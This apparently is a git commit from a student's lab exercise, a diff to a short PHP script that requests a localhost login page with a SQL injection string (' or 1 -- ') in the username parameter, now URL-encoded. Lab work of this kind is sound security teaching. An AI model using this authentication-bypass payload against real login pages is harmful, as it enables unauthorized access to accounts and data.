a3f6ff0ae6796668cbc3f6f1ef1927f3cd724cba
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-09 16:55:33 +0200

    a

--- script.php
+++ script.php
@@ -1,5 +1,5 @@
 <?php
-   $url="http://localhost/lab09/login.php?u=\" or 1 -- ";
+   $url="http://localhost/lab09/login.php?u=\"%20or%201%20--%20";
    $result = file_get_contents($url);
 
    print($result);
